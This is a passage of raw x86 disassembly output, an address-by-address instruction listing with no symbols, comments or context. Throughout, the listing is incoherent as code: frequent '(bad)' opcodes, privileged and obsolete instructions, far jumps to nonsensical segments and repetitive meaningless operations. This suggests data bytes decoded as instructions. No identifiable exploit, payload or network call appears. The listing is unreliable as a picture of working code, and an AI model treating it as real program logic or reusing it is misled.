  4347ea:	sbb    al,0xff
  4347ec:	gs aam 0xd1
  4347ef:	stc    
  4347f0:	rep stos DWORD PTR es:[edi],eax
  4347f2:	(bad)  
  4347f3:	dec    edi
  4347f5:	add    ah,cl
  4347f7:	(bad)  
  4347f8:	inc    DWORD PTR [ebx-0x1d7a006f]
  4347fe:	pop    esi
  4347ff:	into   
  434800:	pop    ss
  434801:	inc    esp
  434802:	cmp    edi,0xffffffe3
  434805:	(bad)  
  434806:	inc    DWORD PTR [eax]
  434808:	inc    DWORD PTR [eax]
  43480a:	cmp    eax,0x7fdb04ff
  43480f:	je     0x434857
  434811:	pop    ebp
  434812:	inc    DWORD PTR [ebx-0x3300ff18]
  434818:	add    bh,bh
  43481a:	aaa    
  43481b:	mov    DWORD PTR [esi+eiz*8],esp
  43481e:	push   edi
  43481f:	imul   eax,DWORD PTR [eax+0x2eff0064],0xffffff89
  434826:	cmp    edi,0xffffff83
  434829:	(bad)  
  43482a:	std    
  43482b:	dec    DWORD PTR [esi-0x6b739a02]
  434831:	add    al,BYTE PTR [eax]
  434833:	cmp    DWORD PTR [ebp-0x7cff0100],0xffffffcc
  43483a:	jns    0x43483b
  43483c:	mov    ds:0x777f0eb1,eax
  434841:	or     eax,0x8cff00
  434846:	add    BYTE PTR [ecx-0x2f7c01],cl
  43484c:	ret    0x36c8
  43484f:	jg     0x434892
  434851:	mov    es,WORD PTR [eax]
  434853:	inc    DWORD PTR [ebx-0x7c007d]
  434859:	push   edi
  43485b:	jmp    DWORD PTR [edi-0x5be08f1f]
  434861:	xchg   ecx,eax
  434862:	add    BYTE PTR [eax],al
  434864:	imul   ecx,DWORD PTR [ecx+0x89],0x7a
  43486b:	inc    DWORD PTR [edx+0x6c55915b]
  434871:	fild   WORD PTR [eax]
  434873:	(bad)  
  434874:	jl     0x434842
  434876:	int3   
  434877:	cmp    edi,0xffffff89
  43487a:	iret   
  43487b:	add    BYTE PTR [edi+ebx*4-0x470c39de],ch
  434882:	inc    DWORD PTR [eax]
  434884:	jmp    0x434886
  434886:	dec    DWORD PTR [ecx-0xbf7d00]
  43488c:	mov    fs,WORD PTR [ebp-0x24]
  43488f:	pop    edx
  434890:	add    edi,ebx
  434892:	add    BYTE PTR [ebx-0xff0e],al
  434898:	int3   
  434899:	inc    DWORD PTR [eax+0x14407300]
  43489f:	jmp    0xc6:0xff8320f5
  4348a6:	int3   
  4348a7:	add    DWORD PTR [eax],0xffffffcc
  4348aa:	iret   
  4348ab:	inc    edi
  4348ad:	mov    esi,0xfc809a9b
  4348b2:	(bad)  
  4348b3:	push   DWORD PTR [esi]
  4348b5:	add    DWORD PTR [eax],0x0
  4348b8:	inc    DWORD PTR [eax]
  4348ba:	mov    BYTE PTR [eax],al
  4348bc:	jb     0x43484c
  4348be:	(bad)  
  4348bf:	jl     0x434881
  4348c1:	dec    ecx
  4348c2:	(bad)  
  4348c3:	call   FWORD PTR [edx-0x76000100]
  4348c9:	add    ch,dl
  4348cb:	mov    DWORD PTR [ebx],esi
  4348cd:	(bad)  
  4348cf:	(bad)  
  4348d1:	leave  
  4348d2:	or     DWORD PTR [ecx+0xff00d1],0x0
  4348d9:	mov    DWORD PTR [ebx+0x1c7698ff],eax
  4348df:	or     BYTE PTR [eax],dh
  4348e1:	stos   BYTE PTR es:[edi],al
  4348e2:	add    bh,bh
  4348e4:	out    dx,eax
  4348e5:	add    BYTE PTR [eax],al
  4348e7:	inc    DWORD PTR [eax]
  4348e9:	push   DWORD PTR [ebx+0x73106783]
  4348ef:	fst    DWORD PTR [ecx+0x1100ff0a]
  4348f5:	(bad)  
  4348f6:	(bad)  
  4348f7:	(bad)  
  4348f8:	inc    DWORD PTR [eax]
  4348fa:	stc    
  4348fb:	mov    DWORD PTR [edi+0x24],ebp
  4348fe:	mov    al,0x13
  434900:	jne    0x434913
  434902:	(bad)  
  434903:	push   DWORD PTR [edi-0x1]
  434906:	add    ah,cl
  434908:	add    BYTE PTR [eax],al
  43490a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43490b:	add    BYTE PTR [eax-0x56],bh
  43490e:	shr    DWORD PTR [ecx+0xff852a],1
  434914:	out    dx,al
  434915:	mov    edi,edi
  434917:	int3   
  434918:	mov    DWORD PTR [eax],eax
  43491a:	and    eax,0x1f1666cc
  43491f:	push   0x1f60
  434924:	imul   eax,DWORD PTR [ebx-0xffff01],0xffffffb1
  43492b:	add    BYTE PTR [ebp-0x56a5fb41],ch
  434931:	dec    eax
  434932:	inc    DWORD PTR [eax]
  434934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434935:	add    bh,bh
  434937:	int3   
  434938:	add    DWORD PTR [ebx-0x68f8009c],0x67
  43493f:	mov    ecx,0xff005310
  434944:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434945:	(bad)  
  434946:	(bad)  
  434947:	inc    DWORD PTR [eax]
  434949:	add    bl,bh
  43494b:	(bad)  
  43494c:	(bad)  
  43494d:	jle    0x434901
  43494f:	jo     0x434974
  434951:	xchg   edx,eax
  434952:	(bad)  
  434953:	jmp    edi
  434955:	(bad)  
  434956:	(bad)  
  434957:	(bad)  
  434958:	inc    DWORD PTR [eax]
  43495a:	and    edi,edi
  43495c:	gs jg  0x434994
  43495f:	ins    DWORD PTR es:[edi],dx
  434960:	imul   ecx,DWORD PTR [ebp+0xd1ffff],0xcccc
  43496a:	push   edi
  43496b:	add    BYTE PTR ds:0x4e19abb9,dl
  434971:	loop   0x434973
  434973:	and    DWORD PTR [eax],0xffffffcc
  434976:	add    bh,bh
  434978:	(bad)  
  434979:	call   FWORD PTR [esi]
  43497b:	call   DWORD PTR [ecx-0x61]
  43497e:	adc    eax,DWORD PTR [edi-0x7684dc]
  434984:	mov    al,0xff
  434986:	(bad)  
  434987:	dec    DWORD PTR [ecx+0x5a83d300]
  43498d:	nop
  43498e:	addr16 retf 
  434990:	sbb    eax,0xe08300de
  434995:	add    BYTE PTR [eax],al
  434997:	inc    DWORD PTR [ebx-0x5d005d00]
  43499d:	pop    ds
  43499e:	hlt    
  43499f:	jnp    0x4349fa
  4349a1:	xor    eax,0xa183ff
  4349a6:	inc    DWORD PTR [eax]
  4349a8:	inc    DWORD PTR [ebx+0x730ecc1c]
  4349ae:	add    bh,BYTE PTR [edi+ecx*4+0x4a83ff08]
  4349b5:	dec    DWORD PTR [ecx-0x1000007d]
  4349bb:	mov    ecx,ecx
  4349bd:	(bad)  
  4349be:	or     ecx,edi
  4349c0:	xor    ch,BYTE PTR [ebx-0x76c30100]
  4349c6:	add    BYTE PTR [eax],al
  4349c8:	add    BYTE PTR [eax],al
  4349ca:	mov    esi,0xfb4d7cff
  4349cf:	sbb    BYTE PTR [eax+0x7700891f],bh
  4349d5:	inc    DWORD PTR [eax]
  4349d7:	(bad)  
  4349d8:	inc    DWORD PTR [ebx+0x19f4002c]
  4349de:	push   ebx
  4349df:	scas   eax,DWORD PTR es:[edi]
  4349e0:	mov    dl,bh
  4349e2:	int3   
  4349e3:	add    BYTE PTR [ebx-0x1],ch
  4349e6:	add    BYTE PTR [eax],al
  4349e8:	inc    DWORD PTR [ebx+0x5efcff4c]
  4349ee:	cmp    DWORD PTR [ecx-0x12],ecx
  4349f1:	adc    edi,edi
  4349f3:	call   DWORD PTR [edx]
  4349f5:	inc    DWORD PTR [eax]
  4349f7:	add    bh,bh
  4349f9:	push   DWORD PTR [ecx+0xa734aff]
  4349ff:	pop    ecx
  434a00:	bound  esp,QWORD PTR [ebx-0x33e10100]
  434a06:	cmp    edi,0xffffffff
  434a09:	jmp    DWORD PTR [esi]
  434a0b:	int3   
  434a0c:	jg     0x434a1b
  434a0e:	and    eax,0xccb398ef
  434a13:	add    edi,0xffffffff
  434a16:	add    BYTE PTR [ecx+0xaff83],cl
  434a1c:	push   esi
  434a1d:	int    0x39
  434a1f:	jno    0x434a38
  434a21:	ss add ah,cl
  434a24:	adc    al,0xff
  434a26:	add    bh,bh
  434a28:	add    DWORD PTR [ebx+0x5c9b83ce],0xffffffae
  434a2f:	xor    BYTE PTR [eax],bl
  434a31:	retf   0x89
  434a34:	xchg   esp,eax
  434a35:	(bad)  
  434a36:	inc    DWORD PTR [eax]
  434a38:	inc    DWORD PTR [eax]
  434a3a:	mov    dh,0xff
  434a3c:	or     al,0x1b
  434a3e:	sbb    DWORD PTR [ecx+0x89b38e],esi
  434a44:	sar    bh,cl
  434a46:	(bad)  
  434a47:	(bad)  
  434a48:	inc    DWORD PTR [eax]
  434a4a:	in     al,0xcc
  434a4c:	sahf   
  434a4d:	int3   
  434a4e:	stos   BYTE PTR es:[edi],al
  434a4f:	jecxz  0x434acd
  434a51:	xor    edi,edi
  434a53:	add    ah,dh
  434a55:	add    ah,cl
  434a57:	add    bh,bh
  434a59:	add    BYTE PTR [edx],cl
  434a5b:	int3   
  434a5c:	outs   dx,BYTE PTR ds:[esi]
  434a5d:	mov    ss,WORD PTR [ebx+0xe0e8c4]
  434a63:	push   ebp
  434a65:	(bad)  
  434a66:	dec    esp
  434a68:	add    BYTE PTR [ebx+0x3407ffad],al
  434a6e:	jp     0x4349f3
  434a70:	or     ebp,DWORD PTR [edi-0x34]
  434a73:	add    BYTE PTR [ebp-0x7601],ch
  434a79:	call   DWORD PTR [ebp-0x1]
  434a7c:	mov    esp,DWORD PTR [edi+0x36]
  434a7f:	mov    ?,WORD PTR [esi]
  434a81:	push   ss
  434a82:	add    bh,bh
  434a84:	xor    cl,ah
  434a86:	inc    DWORD PTR [eax]
  434a88:	add    BYTE PTR [ebx+0x192cfff6],al
  434a8e:	or     dl,dh
  434a90:	pop    ds
  434a91:	dec    esi
  434a92:	mov    edi,edi
  434a94:	jecxz  0x434a96
  434a96:	add    BYTE PTR [ebx+0xea00ff],al
  434a9c:	sti    
  434a9d:	push   edi
  434a9e:	xchg   ebx,eax
  434a9f:	xor    eax,0xff83b2f7
  434aa4:	cli    
  434aa5:	(bad)  
  434aa6:	inc    DWORD PTR [eax]
  434aa8:	(bad)  
  434aa9:	push   ebx
  434aab:	add    dh,ah
  434aad:	(bad)  
  434aae:	fisttp DWORD PTR [esi]
  434ab0:	push   edi
  434ab1:	mov    ch,0xff
  434ab3:	int3   
  434ab4:	mov    DWORD PTR [ebx-0xff0001],eax
  434aba:	adc    eax,0x40bd7f00
  434abf:	dec    ecx
  434ac0:	mov    ah,0x42
  434ac2:	inc    DWORD PTR [eax]
  434ac4:	push   es
  434ac5:	mov    DWORD PTR [eax],eax
  434ac7:	(bad)  
  434ac8:	(bad)  
  434ac9:	dec    DWORD PTR [edi-0x1]
  434acc:	jns    0x434af6
  434ace:	ret    
  434acf:	xor    al,0xa1
  434ad1:	dec    esi
  434ad2:	(bad)  
  434ad3:	(bad)  
  434ad4:	in     al,dx
  434ad5:	mov    DWORD PTR [eax],eax
  434ad7:	add    bh,bh
  434ad9:	int3   
  434ada:	fimul  WORD PTR [ecx+0x66c2f820]
  434ae0:	push   eax
  434ae1:	cwde   
  434ae2:	cmp    edi,0x6e
  434ae5:	add    BYTE PTR [ebx-0x3c000100],al
  434aeb:	add    bh,ah
  434aed:	scas   eax,DWORD PTR es:[edi]
  434aee:	loopne 0x434ad5
  434af0:	cwde   
  434af1:	rol    BYTE PTR [ebx-0x76ffb500],1
  434af7:	add    BYTE PTR [eax],al
  434af9:	call   DWORD PTR [edi]
  434afb:	jmp    DWORD PTR [ebx+0x47645643]
  434b01:	icebp  
  434b02:	(bad)  
  434b03:	jmp    FWORD PTR [edx-0x1]
  434b06:	inc    DWORD PTR [eax]
  434b08:	inc    DWORD PTR [eax]
  434b0a:	add    eax,0xaf1bf8ff
  434b0f:	sub    DWORD PTR [ebx],ebx
  434b11:	cmp    edi,0xffffffff
  434b14:	(bad)  
  434b16:	cmp    edi,0xffffff83
  434b19:	add    ah,ah
  434b1b:	inc    ecx
  434b1d:	or     dl,BYTE PTR [bp+si+0x24]
  434b21:	loope  0x434b23
  434b23:	call   DWORD PTR [ecx-0xff0034]
  434b29:	jmp    esi
  434b2b:	add    bh,ch
  434b2d:	sub    bh,BYTE PTR [eax-0x33e92cca]
  434b33:	call   FWORD PTR [ebp+0xffff00]
  434b39:	inc    DWORD PTR [eax-0x1]
  434b3c:	imul   esp,edi,0xfffffffe
  434b3f:	cli    
  434b40:	mov    DWORD PTR [edi-0x1],0xff0072ff
  434b47:	add    BYTE PTR [ebx-0x21000900],al
  434b4d:	and    DWORD PTR [esi],0x33
  434b50:	push   es
  434b51:	jbe    0x434b53
  434b53:	add    al,dl
  434b55:	add    DWORD PTR [eax],0xffffffff
  434b58:	add    DWORD PTR [eax],0x62
  434b5b:	mov    DWORD PTR [edx],ebp
  434b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434b5e:	xchg   ebp,eax
  434b5f:	pop    edi
  434b60:	xchg   DWORD PTR [ebx],ebp
  434b62:	add    BYTE PTR [ecx+0x89ff8f],cl
  434b68:	(bad)  
  434b69:	call   FWORD PTR [ebp-0x53630700]
  434b6f:	ror    BYTE PTR [ebx+ecx*8],cl
  434b72:	add    BYTE PTR [eax],al
  434b74:	xor    eax,DWORD PTR [eax]
  434b76:	cmp    edi,0x0
  434b79:	jmp    DWORD PTR [esi]
  434b7b:	add    BYTE PTR [ecx],ch
  434b7d:	cli    
  434b7e:	pop    edx
  434b7f:	bound  edi,QWORD PTR [ebx+0x4c]
  434b82:	add    bh,bh
  434b84:	mov    esi,0xff00ffff
  434b89:	sbb    DWORD PTR [eax-0x1769db01],0xffffffb3
  434b90:	push   0xffffffc7
  434b92:	add    BYTE PTR [eax],al
  434b94:	mov    esp,cs
  434b96:	add    BYTE PTR [ebx+0xff],al
  434b9c:	js     0x434bd6
  434b9e:	ret    
  434b9f:	es aam 0x71
  434ba2:	(bad)  
  434ba3:	push   DWORD PTR [ebx-0x77]
  434ba6:	inc    DWORD PTR [eax]
  434ba8:	int3   
  434ba9:	add    BYTE PTR [edi+edi*8],ch
  434bac:	dec    esi
  434bad:	jl     0x434be3
  434baf:	add    bl,BYTE PTR [esi+0x6183ffb0]
  434bb5:	cmp    edi,0x0
  434bb8:	int3   
  434bb9:	add    ebx,0xffffff89
  434bbc:	call   0xffe9:0xd30bcfe5
  434bc3:	add    BYTE PTR [edx+0x0],al
  434bc6:	(bad)  
  434bc7:	(bad)  
  434bc8:	inc    DWORD PTR [ebx-0x61d50004]
  434bce:	xchg   cl,al
  434bd0:	clc    
  434bd1:	dec    ebp
  434bd2:	(bad)  
  434bd3:	call   FWORD PTR [ebx-0x7c7d]
  434bd9:	sbb    DWORD PTR [edi+edi*8-0x4e],0x0
  434bde:	inc    edi
  434bdf:	cmp    ebp,DWORD PTR [ebx]
  434be1:	mov    eax,0xb3ffff
  434be6:	inc    DWORD PTR [eax]
  434be8:	cmp    edi,0x52
  434beb:	add    al,ah
  434bed:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  434bef:	lds    esp,FWORD PTR [ebx]
  434bf1:	push   ss
  434bf2:	add    bh,bh
  434bf4:	stc    
  434bf5:	dec    esp
  434bf7:	add    DWORD PTR [ebx-0x2fff6900],0xffffffc0
  434bfe:	fmul   QWORD PTR ds:[ebx+0x51]
  434c02:	add    bh,bh
  434c04:	mov    WORD PTR [eax],es
  434c06:	dec    DWORD PTR [ecx-0x7c8d3400]
  434c0c:	ja     0x434bca
  434c0e:	push   0xffcb5922
  434c13:	inc    DWORD PTR [ecx]
  434c15:	add    BYTE PTR [eax],al
  434c17:	(bad)  
  434c18:	inc    DWORD PTR [eax]
  434c1a:	sbb    DWORD PTR [eax],eax
  434c1c:	pushf  
  434c1d:	into   
  434c1e:	mov    ecx,0xff371d95
  434c23:	or     DWORD PTR [edx],0x0
  434c26:	inc    DWORD PTR [eax]
  434c28:	inc    DWORD PTR [ebx-0x4144ffd8]
  434c2e:	xchg   edi,eax
  434c2f:	push   DWORD PTR [edi+0x310000c4]
  434c35:	inc    DWORD PTR [eax]
  434c37:	mov    esp,ecx
  434c39:	(bad)  
  434c3a:	in     al,dx
  434c3b:	jmp    ebx
  434c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434c3e:	popf   
  434c3f:	jae    0x434c14
  434c41:	ss (bad) 
  434c43:	dec    DWORD PTR [eax]
  434c45:	cmp    edi,0xffffff83
  434c48:	(bad)  
  434c49:	jmp    FWORD PTR [ecx]
  434c4b:	inc    DWORD PTR [eax+ebx*8]
  434c4e:	xor    al,0xdf
  434c50:	push   ecx
  434c51:	out    dx,al
  434c52:	inc    DWORD PTR [eax]
  434c54:	pop    ebp
  434c55:	add    bh,bh
  434c57:	inc    DWORD PTR [eax]
  434c59:	sub    DWORD PTR [edi-0x6a2d8901],0xffffff9b
  434c60:	std    
  434c61:	test   ah,cl
  434c63:	(bad)  
  434c64:	stc    
  434c65:	add    BYTE PTR [eax],al
  434c67:	inc    DWORD PTR [ebx+0x40ff5bff]
  434c6d:	jb     0x434c52
  434c6f:	arpl   WORD PTR [ebp-0x20],dx
  434c72:	mov    edi,edi
  434c74:	out    dx,eax
  434c75:	inc    DWORD PTR [ebx-0x4b7c0001]
  434c7b:	mov    eax,ebx
  434c7d:	or     bh,dh
  434c7f:	lea    edx,[esi-0x62]
  434c82:	add    ah,cl
  434c84:	in     al,0xff
  434c86:	add    bh,bh
  434c88:	mov    edi,edi
  434c8a:	xor    al,0xff
  434c8c:	sub    ebp,DWORD PTR [ebx-0x58b7cc1]
  434c92:	(bad)  
  434c93:	call   DWORD PTR [edi+edi*8-0x330100]
  434c9a:	jmp    0x69bd:0xf7c0e483
  434ca1:	int    0xff
  434ca3:	adc    DWORD PTR [edi-0x1],0x0
  434ca7:	mov    DWORD PTR [eax],eax
  434ca9:	call   FWORD PTR [edi-0x18181701]
  434caf:	jp     0x434c80
  434cb1:	pushf  
  434cb2:	inc    DWORD PTR [eax]
  434cb4:	xchg   DWORD PTR [eax],eax
  434cb6:	dec    esp
  434cb8:	add    BYTE PTR [eax],al
  434cba:	fild   WORD PTR [ebx+0x381f81d8]
  434cc0:	je     0x434cff
  434cc2:	inc    DWORD PTR [eax]
  434cc4:	or     bh,bh
  434cc6:	(bad)  
  434cc7:	dec    DWORD PTR [ecx+0x7ccd900]
  434ccd:	add    DWORD PTR [edi],edx
  434ccf:	pop    ecx
  434cd0:	enter  0x8341,0x0
  434cd4:	mov    ecx,0xffffffff
  434cd9:	adc    esp,0xffffffff
  434cdc:	cs mov bl,0xc2
  434cdf:	fimul  WORD PTR [esi+0x1800ff99]
  434ce5:	add    bh,bh
  434ce7:	add    DWORD PTR [ebx-0x31001801],0x61
  434cee:	(bad)  
  434cef:	pop    esp
  434cf0:	adc    eax,0x42ffff4f
  434cf5:	dec    esp
  434cf7:	add    ah,cl
  434cf9:	add    BYTE PTR [eax],ah
  434cfb:	add    BYTE PTR [esi-0x7d],al
  434cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434cff:	push   eax
  434d00:	jb     0x434cfb
  434d02:	add    BYTE PTR [eax],al
  434d04:	xchg   esi,eax
  434d05:	mov    DWORD PTR [eax],eax
  434d07:	add    BYTE PTR [eax],al
  434d09:	add    bl,al
  434d0b:	add    bh,cl
  434d0d:	test   BYTE PTR [ecx-0xfab724],dl
  434d13:	add    BYTE PTR [ecx-0x760100],ch
  434d19:	push   DWORD PTR ds:0xd2e96d00
  434d1f:	push   ecx
  434d20:	outs   dx,DWORD PTR ds:[esi]
  434d21:	jbe    0x434d23
  434d23:	(bad)  
  434d24:	jns    0x434d26
  434d26:	(bad)  
  434d27:	dec    esp
  434d29:	add    BYTE PTR [ecx-0x1],ah
  434d2c:	test   DWORD PTR ds:0x3bd3c89b,edi
  434d32:	add    DWORD PTR [eax],0x27
  434d35:	inc    DWORD PTR [eax]
  434d37:	dec    esp
  434d39:	add    DWORD PTR [ecx-0x1],0xffffffc0
  434d3d:	(bad)  
  434d3e:	sub    al,0x84
  434d40:	xor    BYTE PTR [eax-0x1],dl
  434d43:	(bad)  
  434d44:	aas    
  434d45:	inc    DWORD PTR [eax]
  434d47:	inc    DWORD PTR [eax]
  434d49:	add    eax,0x0
  434d4c:	cli    
  434d4d:	ret    
  434d4e:	ss inc esi
  434d50:	retf   
  434d51:	xchg   bh,bh
  434d53:	call   DWORD PTR [ecx]
  434d55:	dec    esp
  434d57:	(bad)  
  434d58:	inc    DWORD PTR [eax]
  434d5a:	mov    ch,0x0
  434d5c:	dec    ebx
  434d5d:	add    ebp,DWORD PTR [eax-0x55]
  434d60:	mov    ebp,0x8ffff75
  434d65:	add    bh,bh
  434d67:	add    DWORD PTR [ebx-0x700b101],0xffffffad
  434d6e:	push   esi
  434d6f:	jg     0x434d3c
  434d71:	nop
  434d72:	(bad)  
  434d73:	inc    DWORD PTR [edi-0x1000000]
  434d79:	call   DWORD PTR [esi-0x1]
  434d7c:	les    ebx,FWORD PTR [ebx+0x21]
  434d7f:	outs   dx,BYTE PTR ds:[esi]
  434d80:	mov    ah,0x85
  434d82:	cmp    edi,0x33
  434d85:	(bad)  
  434d86:	(bad)  
  434d87:	inc    DWORD PTR [eax]
  434d89:	int3   
  434d8a:	cli    
  434d8b:	jmp    DWORD PTR [esi]
  434d8d:	shl    ch,cl
  434d8f:	mul    edi
  434d91:	fadd   DWORD PTR [eax]
  434d93:	add    DWORD PTR [ecx-0x1],0x0
  434d97:	add    bh,bh
  434d99:	push   DWORD PTR [ecx]
  434d9b:	add    BYTE PTR [eiz*8-0xc3c167c],cl
  434da2:	int3   
  434da3:	add    bl,dl
  434da5:	int3   
  434da6:	add    BYTE PTR [ebx-0x7c557c7d],al
  434dac:	aaa    
  434dad:	sub    esp,DWORD PTR ds:0xc87334
  434db3:	add    BYTE PTR [ecx-0x77],dh
  434db9:	jmp    DWORD PTR [eax]
  434dbb:	xor    DWORD PTR [esi+edi*8],0x4f
  434dbf:	mov    eax,ds:0x83004058
  434dc4:	je     0x434d4f
  434dc6:	cmp    edi,0xffffffff
  434dc9:	(bad)  
  434dca:	fdivr  st,st(7)
  434dcc:	mov    ecx,DWORD PTR [ecx+0x600b3921]
  434dd2:	add    BYTE PTR [eax],al
  434dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  434dd5:	mov    esp,ecx
  434dd7:	inc    DWORD PTR [ebx-0x1c339d77]
  434ddd:	xor    cl,BYTE PTR [esi]
  434ddf:	aad    0xd5
  434de1:	push   esp
  434de2:	inc    DWORD PTR [eax]
  434de4:	cdq    
  434de5:	or     esp,0xffffff83
  434de8:	add    bh,bh
  434dea:	stos   BYTE PTR es:[edi],al
  434deb:	call   DWORD PTR [ebx-0x3c335369]
  434df1:	push   ds
  434df2:	(bad)  
  434df3:	jmp    DWORD PTR [ecx+ecx*4-0x1]
  434df7:	add    bh,bh
  434df9:	add    BYTE PTR [esi+0x0],dl
  434dfc:	mov    ds:0xa97615be,al
  434e01:	push   ebp
  434e02:	(bad)  
  434e03:	inc    ebp
  434e05:	add    DWORD PTR [eax],0xffffffff
  434e08:	add    ah,cl
  434e0a:	call   0xb3474d92
  434e0f:	xor    eax,0xffffc1c9
  434e14:	xchg   edi,edi
  434e16:	add    bh,bh
  434e18:	inc    DWORD PTR [eax]
  434e1a:	inc    edx
  434e1b:	inc    DWORD PTR [ebx]
  434e1d:	mov    dh,0xca
  434e1f:	push   ds
  434e20:	xchg   edi,eax
  434e21:	xor    bh,bh
  434e23:	jmp    ebx
  434e25:	add    bh,bh
  434e27:	inc    DWORD PTR [ebx-0xc763401]
  434e2d:	clc    
  434e2e:	mov    esp,DWORD PTR [edx-0x50]
  434e31:	into   
  434e32:	(bad)  
  434e33:	dec    DWORD PTR [edi-0x1]
  434e36:	add    DWORD PTR [ebx+0x1cff83],0x70
  434e3d:	icebp  
  434e3e:	xor    dl,BYTE PTR [esi+0x2a]
  434e41:	inc    eax
  434e42:	add    BYTE PTR [ecx-0x7c000024],cl
  434e48:	add    ah,cl
  434e4a:	or     bh,bh
  434e4c:	aaa    
  434e4d:	mov    edi,gs
  434e4f:	or     BYTE PTR [ebp-0x1],bh
  434e52:	(bad)  
  434e53:	call   DWORD PTR [ebx]
  434e55:	(bad)  
  434e56:	inc    DWORD PTR [eax]
  434e58:	cmp    edi,0x32
  434e5b:	jmp    DWORD PTR [ecx]
  434e5d:	mov    ah,0x8c
  434e5f:	leave  
  434e60:	repz jb 0x434e62
  434e63:	call   FWORD PTR [esp+ecx*8-0x10000]
  434e6a:	add    BYTE PTR [eax],al
  434e6c:	(bad)  
  434e6d:	outs   dx,BYTE PTR ds:[esi]
  434e6e:	mov    ?,WORD PTR [ecx]
  434e70:	push   esi
  434e71:	adc    edi,edi
  434e73:	add    BYTE PTR [esi-0x1],ah
  434e76:	or     esp,0xffffff89
  434e79:	int3   
  434e7a:	jp     0x434e7b
  434e7c:	outs   dx,BYTE PTR ds:[esi]
  434e7d:	lods   al,BYTE PTR ds:[esi]
  434e7e:	imul   ebp,DWORD PTR [edi-0xd],0xfffffffb
  434e82:	dec    DWORD PTR [ecx-0x7600ffcc]
  434e88:	add    BYTE PTR [eax],al
  434e8a:	scas   al,BYTE PTR es:[edi]
  434e8b:	dec    DWORD PTR [edi+0x3a]
  434e8e:	hlt    
  434e8f:	push   ebp
  434e90:	mov    ah,0x5e
  434e92:	inc    DWORD PTR [eax]
  434e94:	mov    edx,0xffffcccc
  434e99:	jmp    FWORD PTR [ecx]
  434e9b:	add    BYTE PTR [edi-0x78],ch
  434e9e:	mov    al,ds:0x6f1561
  434ea3:	jmp    DWORD PTR [edx]
  434ea5:	(bad)  
  434ea6:	inc    DWORD PTR [eax]
  434ea8:	add    bh,bh
  434eaa:	(bad)  
  434eab:	dec    DWORD PTR [ecx]
  434ead:	dec    edx
  434eae:	aaa    
  434eaf:	out    0xd6,eax
  434eb1:	push   es
  434eb2:	add    BYTE PTR [eax],al
  434eb4:	push   ebp
  434eb5:	add    bh,bh
  434eb7:	mov    DWORD PTR [ebx-0xd00c601],eax
  434ebd:	jb     0x434e3f
  434ebf:	lods   eax,DWORD PTR ds:[esi]
  434ec0:	xor    eax,0xd5008997
  434ec5:	add    DWORD PTR [eax],0xffffffcc
  434ec8:	inc    DWORD PTR [eax]
  434eca:	adc    al,0x0
  434ecc:	aaa    
  434ecd:	xchg   ecx,eax
  434ece:	in     eax,dx
  434ecf:	mov    ecx,0xffffb754
  434ed4:	cmp    eax,0x83008383
  434ed9:	dec    DWORD PTR [edx-0x34]
  434edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434edd:	jno    0x434e6b
  434edf:	sub    BYTE PTR [edx-0x34],bh
  434ee2:	cmp    edi,0xffffffe5
  434ee5:	dec    DWORD PTR [ecx-0x3333ff7d]
  434eeb:	add    BYTE PTR [edx],dl
  434eed:	dec    edi
  434eee:	adc    ebp,DWORD PTR [ebx+0xff0f29]
  434ef4:	xor    bh,bh
  434ef6:	inc    DWORD PTR [ebx-0x9aff7d]
  434efc:	mov    edi,DWORD PTR [esi-0x94d1e23]
  434f02:	add    bh,bh
  434f04:	pop    ebp
  434f05:	add    BYTE PTR [ebx-0x6e000077],al
  434f0b:	add    BYTE PTR [ecx-0x19],bh
  434f0e:	mov    esi,0xffa4c3ee
  434f13:	jmp    DWORD PTR [edi+0x0]
  434f16:	inc    DWORD PTR [eax]
  434f18:	inc    DWORD PTR [eax]
  434f1a:	push   0x18a64400
  434f1f:	dec    edx
  434f20:	out    0x7d,eax
  434f22:	add    BYTE PTR [ecx-0x7c0033f9],cl
  434f28:	add    ah,cl
  434f2a:	inc    DWORD PTR [eax]
  434f2c:	cwde   
  434f2d:	call   0xba547f25
  434f32:	(bad)  
  434f33:	jmp    FWORD PTR [edx]
  434f35:	add    bh,bh
  434f37:	add    BYTE PTR [ebx+0x7c007d00],al
  434f3d:	jbe    0x434fb4
  434f3f:	in     al,0x51
  434f41:	cs add bh,bh
  434f44:	retf   0xff
  434f47:	mov    edi,edi
  434f49:	int3   
  434f4a:	inc    eax
  434f4b:	jmp    FWORD PTR [edx+0x51]
  434f4e:	jle    0x434fcd
  434f50:	shr    DWORD PTR [ebx+0x31ffff],0x89
  434f57:	(bad)  
  434f58:	(bad)  
  434f59:	(bad)  
  434f5a:	cmp    al,0xcc
  434f5c:	stos   BYTE PTR es:[edi],al
  434f5d:	mov    esp,0xe4f81884
  434f62:	inc    DWORD PTR [ebx-0x7d]
  434f68:	(bad)  
  434f69:	(bad)  
  434f6a:	out    dx,eax
  434f6b:	int3   
  434f6c:	test   BYTE PTR [ebx-0x57befff2],0x0
  434f73:	push   DWORD PTR [eax+eax*1-0x7600ff7d]
  434f7a:	pop    eax
  434f7b:	add    BYTE PTR [eax+0x204c04d4],ch
  434f81:	xchg   edx,eax
  434f82:	int3   
  434f83:	int3   
  434f84:	xchg   ecx,eax
  434f85:	cmp    edi,0xffffff83
  434f88:	(bad)  
  434f89:	dec    ecx
  434f8b:	jmp    esp
  434f8d:	leave  
  434f8e:	lods   al,BYTE PTR ds:[esi]
  434f8f:	les    esi,FWORD PTR [edi+edx*8]
  434f92:	add    bh,bh
  434f94:	cmc    
  434f95:	int3   
  434f96:	(bad)  
  434f97:	(bad)  
  434f98:	(bad)  
  434f99:	inc    DWORD PTR [ecx-0x1]
  434f9c:	mov    dl,0x92
  434f9e:	dec    ebp
  434f9f:	jp     0x434f90
  434fa1:	xor    bh,bh
  434fa3:	int3   
  434fa4:	dec    ebx
  434fa5:	inc    DWORD PTR [eax]
  434fa7:	add    bh,bh
  434fa9:	add    BYTE PTR [edi+edi*8-0x788a1d87],al
  434fb0:	retf   0xff2c
  434fb3:	add    bh,ah
  434fb5:	add    BYTE PTR [eax],al
